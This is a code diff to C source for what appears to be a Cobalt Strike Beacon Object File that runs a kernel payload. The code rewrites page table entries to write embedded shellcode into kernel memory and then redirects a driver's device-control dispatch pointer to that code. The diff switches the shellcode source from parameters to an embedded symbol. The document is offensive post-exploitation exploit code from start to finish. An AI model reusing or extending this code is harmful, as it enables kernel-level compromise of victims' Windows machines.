@@ -22,10 +22,12 @@
  *
 **/
 
-D_SEC( B ) VOID WINAPI PteExecuteKernelPayload( _In_ PBEACON_API BeaconApi, _In_ PAPI Api, _In_ PVOID Buffer, _In_ ULONG Length )
+D_SEC( B ) VOID WINAPI PteExecuteKernelPayload( _In_ PBEACON_API BeaconApi, _In_ PAPI Api )
 {
 	HANDLE				Dev = NULL;
 	PVOID				Img = NULL;
+	PVOID				Shc = NULL;
+	ULONG				Shl = 0;
 
 	PVOID				Ctr = NULL;
 	PVOID				Obj = NULL;
@@ -150,7 +152,11 @@ D_SEC( B ) VOID WINAPI PteExecuteKernelPayload( _In_ PBEACON_API BeaconApi, _In_
 
 						if ( ! Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Pte, &Mmp, sizeof( Mmp ), NULL ) ) 
 						{
-							if ( !( Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Tgt, Buffer, Length, NULL ) >= 0 ) ) {
+							/* Extract SC and pass params! */
+							Shc = C_PTR( G_SYM( KernelShellcode ) );
+							Shl = G_END( ) - G_SYM( KernelShellcode );
+
+							if ( !( Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Tgt, Shc, Shl, NULL ) >= 0 ) ) {
 								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not write to header." ) ) );
 								goto Leave;
 							};
@@ -182,6 +188,8 @@ D_SEC( B ) VOID WINAPI PteExecuteKernelPayload( _In_ PBEACON_API BeaconApi, _In_
 								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read driver object." ) ) );
 								goto Leave;
 							};
+
+							/* IMPROVE THIS! */
 
 							Ctr = C_PTR( Drv.MajorFunction[ 0x0e ] );
 							Drv.MajorFunction[ 0x0e ] = C_PTR( Tgt );
